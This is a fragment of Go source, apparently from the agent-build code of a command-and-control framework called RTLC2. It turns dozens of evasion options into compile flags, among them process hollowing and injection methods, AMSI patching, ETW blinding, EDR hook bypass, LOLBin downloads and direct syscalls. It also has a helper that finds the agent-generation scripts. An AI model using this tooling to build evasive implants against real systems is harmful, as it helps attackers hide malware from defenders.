		fmt.Sprintf("RTLC2_EVASION_REFLECTIVE_DLL=%s", boolToDefine(ev.MemoryLoaders.ReflectiveDLL)),
		fmt.Sprintf("RTLC2_EVASION_MANUAL_MAP=%s", boolToDefine(ev.MemoryLoaders.ManualMap)),
		fmt.Sprintf("RTLC2_EVASION_MODULE_OVERLOAD=%s", boolToDefine(ev.MemoryLoaders.ModuleOverload)),
		fmt.Sprintf("RTLC2_EVASION_TRANSACTED_HOLLOW=%s", boolToDefine(ev.MemoryLoaders.TransactedHollow)),
		fmt.Sprintf("RTLC2_EVASION_GHOSTLY_HOLLOW=%s", boolToDefine(ev.MemoryLoaders.GhostlyHollow)),
		fmt.Sprintf("RTLC2_EVASION_PHANTOM_DLL=%s", boolToDefine(ev.MemoryLoaders.PhantomDLL)),
		fmt.Sprintf("RTLC2_EVASION_DOPPELGANGING=%s", boolToDefine(ev.MemoryLoaders.DoppelGanging)),
		fmt.Sprintf("RTLC2_EVASION_HERPADERPING=%s", boolToDefine(ev.MemoryLoaders.Herpaderping)),
		fmt.Sprintf("RTLC2_EVASION_PROCESS_HOLLOW=%s", boolToDefine(ev.MemoryLoaders.ProcessHollow)),
		fmt.Sprintf("RTLC2_EVASION_MEMORY_MODULE=%s", boolToDefine(ev.MemoryLoaders.MemoryModule)),

		// Evasion: Process Injection
		fmt.Sprintf("RTLC2_EVASION_CLASSIC_INJECTION=%s", boolToDefine(ev.ProcessInjection.ClassicInjection)),
		fmt.Sprintf("RTLC2_EVASION_APC_QUEUE=%s", boolToDefine(ev.ProcessInjection.APCQueueInjection)),
		fmt.Sprintf("RTLC2_EVASION_THREAD_HIJACK=%s", boolToDefine(ev.ProcessInjection.ThreadHijack)),
		fmt.Sprintf("RTLC2_EVASION_EARLY_BIRD=%s", boolToDefine(ev.ProcessInjection.EarlyBird)),
		fmt.Sprintf("RTLC2_EVASION_ATOM_BOMBING=%s", boolToDefine(ev.ProcessInjection.AtomBombing)),
		fmt.Sprintf("RTLC2_EVASION_NT_CREATE_SECTION=%s", boolToDefine(ev.ProcessInjection.NtCreateSection)),
		fmt.Sprintf("RTLC2_EVASION_KERNEL_CALLBACK=%s", boolToDefine(ev.ProcessInjection.KernelCallback)),
		fmt.Sprintf("RTLC2_EVASION_FIBER_INJECTION=%s", boolToDefine(ev.ProcessInjection.FiberInjection)),
		fmt.Sprintf("RTLC2_EVASION_ENCLAVE_INJECTION=%s", boolToDefine(ev.ProcessInjection.EnclaveInjection)),
		fmt.Sprintf("RTLC2_EVASION_POOL_PARTY=%s", boolToDefine(ev.ProcessInjection.PoolParty)),

		// Evasion: AMSI / Script
		fmt.Sprintf("RTLC2_EVASION_AMSI_PATCH=%s", boolToDefine(ev.AMSIScript.AMSIPatch)),
		fmt.Sprintf("RTLC2_EVASION_AMSI_SCAN_BUFFER=%s", boolToDefine(ev.AMSIScript.AMSIScanBuffer)),
		fmt.Sprintf("RTLC2_EVASION_AMSI_PROVIDER_HIJACK=%s", boolToDefine(ev.AMSIScript.AMSIProviderHijack)),
		fmt.Sprintf("RTLC2_EVASION_WLDP_BYPASS=%s", boolToDefine(ev.AMSIScript.WLDPBypass)),
		fmt.Sprintf("RTLC2_EVASION_SCRIPT_BLOCK=%s", boolToDefine(ev.AMSIScript.ScriptBlock)),
		fmt.Sprintf("RTLC2_EVASION_CLM_BYPASS=%s", boolToDefine(ev.AMSIScript.CLMBypass)),
		fmt.Sprintf("RTLC2_EVASION_PS_HOLLOW=%s", boolToDefine(ev.AMSIScript.PowerShellHollow)),
		fmt.Sprintf("RTLC2_EVASION_DOTNET_PATCH=%s", boolToDefine(ev.AMSIScript.DotNetPatch)),
		fmt.Sprintf("RTLC2_EVASION_SCRIPT_OBFUSCATE=%s", boolToDefine(ev.AMSIScript.ScriptObfuscate)),
		fmt.Sprintf("RTLC2_EVASION_JSCRIPT_BYPASS=%s", boolToDefine(ev.AMSIScript.JScriptBypass)),

		// Evasion: LOLBins
		fmt.Sprintf("RTLC2_EVASION_CERTUTIL=%s", boolToDefine(ev.LOLBins.CertUtil)),
		fmt.Sprintf("RTLC2_EVASION_BITSADMIN=%s", boolToDefine(ev.LOLBins.BitsAdmin)),
		fmt.Sprintf("RTLC2_EVASION_MPCMDRUN=%s", boolToDefine(ev.LOLBins.MpCmdRun)),
		fmt.Sprintf("RTLC2_EVASION_ESENTUTL=%s", boolToDefine(ev.LOLBins.Esentutl)),
		fmt.Sprintf("RTLC2_EVASION_EXPAND_DL=%s", boolToDefine(ev.LOLBins.ExpandDL)),
		fmt.Sprintf("RTLC2_EVASION_EXTRACT_DL=%s", boolToDefine(ev.LOLBins.ExtractDL)),
		fmt.Sprintf("RTLC2_EVASION_HH=%s", boolToDefine(ev.LOLBins.Hh)),
		fmt.Sprintf("RTLC2_EVASION_IE4UINIT=%s", boolToDefine(ev.LOLBins.Ie4uInit)),
		fmt.Sprintf("RTLC2_EVASION_REPLACE_DL=%s", boolToDefine(ev.LOLBins.Replace)),
		fmt.Sprintf("RTLC2_EVASION_XCOPY=%s", boolToDefine(ev.LOLBins.XCopy)),

		// Evasion: EDR Behavioral
		fmt.Sprintf("RTLC2_EVASION_HOOK_BYPASS=%s", boolToDefine(ev.EDRBehavioral.UserModeHookBypass)),
		fmt.Sprintf("RTLC2_EVASION_KERNEL_CALLBACKS=%s", boolToDefine(ev.EDRBehavioral.KernelCallbacks)),
		fmt.Sprintf("RTLC2_EVASION_ETW_BLINDING=%s", boolToDefine(ev.EDRBehavioral.ETWBlinding)),
		fmt.Sprintf("RTLC2_EVASION_STACK_SPOOFING=%s", boolToDefine(ev.EDRBehavioral.StackSpoofing)),
		fmt.Sprintf("RTLC2_EVASION_CALL_STACK_MASK=%s", boolToDefine(ev.EDRBehavioral.CallStackMask)),
		fmt.Sprintf("RTLC2_EVASION_RET_ADDR_SPOOF=%s", boolToDefine(ev.EDRBehavioral.ReturnAddrSpoof)),
		fmt.Sprintf("RTLC2_EVASION_INDIRECT_SYSCALL=%s", boolToDefine(ev.EDRBehavioral.IndirectSyscall)),
		fmt.Sprintf("RTLC2_EVASION_TIMESTAMP_MANIP=%s", boolToDefine(ev.EDRBehavioral.TimestampManip)),
		fmt.Sprintf("RTLC2_EVASION_THREADLESS_INJECT=%s", boolToDefine(ev.EDRBehavioral.ThreadlessInject)),
		fmt.Sprintf("RTLC2_EVASION_HW_BREAKPOINTS=%s", boolToDefine(ev.EDRBehavioral.HWBreakpoints)),

		// Evasion: .NET
		fmt.Sprintf("RTLC2_EVASION_IN_MEMORY_ASSEMBLY=%s", boolToDefine(ev.DotNet.InMemoryAssembly)),
		fmt.Sprintf("RTLC2_EVASION_APP_DOMAIN_MGR=%s", boolToDefine(ev.DotNet.AppDomainManager)),
		fmt.Sprintf("RTLC2_EVASION_CLR_HOSTING=%s", boolToDefine(ev.DotNet.CLRHosting)),
		fmt.Sprintf("RTLC2_EVASION_DYNAMIC_INVOKE=%s", boolToDefine(ev.DotNet.DynamicInvoke)),
		fmt.Sprintf("RTLC2_EVASION_REFLECTION_OBFUSC=%s", boolToDefine(ev.DotNet.ReflectionObfusc)),
		fmt.Sprintf("RTLC2_EVASION_ASSEMBLY_LOAD_BYTE=%s", boolToDefine(ev.DotNet.AssemblyLoadByte)),
		fmt.Sprintf("RTLC2_EVASION_TYPE_CONFUSION=%s", boolToDefine(ev.DotNet.TypeConfusion)),
		fmt.Sprintf("RTLC2_EVASION_GC=%s", boolToDefine(ev.DotNet.GarbageCollector)),
		fmt.Sprintf("RTLC2_EVASION_MIXED_ASSEMBLY=%s", boolToDefine(ev.DotNet.MixedAssembly)),
		fmt.Sprintf("RTLC2_EVASION_PROFILER_ATTACH=%s", boolToDefine(ev.DotNet.ProfilerAttach)),

		// Evasion: Syscalls
		fmt.Sprintf("RTLC2_EVASION_DIRECT_SYSCALLS=%s", boolToDefine(ev.Syscalls.DirectSyscalls)),
		fmt.Sprintf("RTLC2_EVASION_INDIRECT_SYSCALLS=%s", boolToDefine(ev.Syscalls.IndirectSyscalls)),
		fmt.Sprintf("RTLC2_EVASION_SYSCALL_STUB=%s", boolToDefine(ev.Syscalls.SyscallStub)),
		fmt.Sprintf("RTLC2_EVASION_SYSCALL_RANDOMIZE=%s", boolToDefine(ev.Syscalls.SyscallRandomize)),
		fmt.Sprintf("RTLC2_EVASION_SYSCALL_UNHOOK=%s", boolToDefine(ev.Syscalls.SyscallUnhook)),
		fmt.Sprintf("RTLC2_EVASION_SYSCALL_GATE=%s", boolToDefine(ev.Syscalls.SyscallGate)),
		fmt.Sprintf("RTLC2_EVASION_HELLS_GATE=%s", boolToDefine(ev.Syscalls.HellsGate)),
		fmt.Sprintf("RTLC2_EVASION_HALOS_GATE=%s", boolToDefine(ev.Syscalls.HalosGate)),
		fmt.Sprintf("RTLC2_EVASION_TARTARUS_GATE=%s", boolToDefine(ev.Syscalls.TartarusGate)),
		fmt.Sprintf("RTLC2_EVASION_RECYCLED_GATE=%s", boolToDefine(ev.Syscalls.RecycledGate)),
	}

	return vars
}

// ---------------------------------------------------------------------------
// findScriptsDir locates the scripts directory by checking common paths.
// ---------------------------------------------------------------------------
func findScriptsDir() string {
	candidates := []string{
		"./scripts",
		"../scripts",
		filepath.Join(filepath.Dir(os.Args[0]), "..", "scripts"),
		filepath.Join(filepath.Dir(os.Args[0]), "..", "..", "scripts"),
		"/opt/RTLC2/scripts",
	}

	for _, dir := range candidates {
		agentScript := filepath.Join(dir, "generate_agent.sh")
		if _, err := os.Stat(agentScript); err == nil {
			absDir, err := filepath.Abs(dir)
			if err != nil {
				return dir
			}
			return absDir
		}
	}

	return ""
}
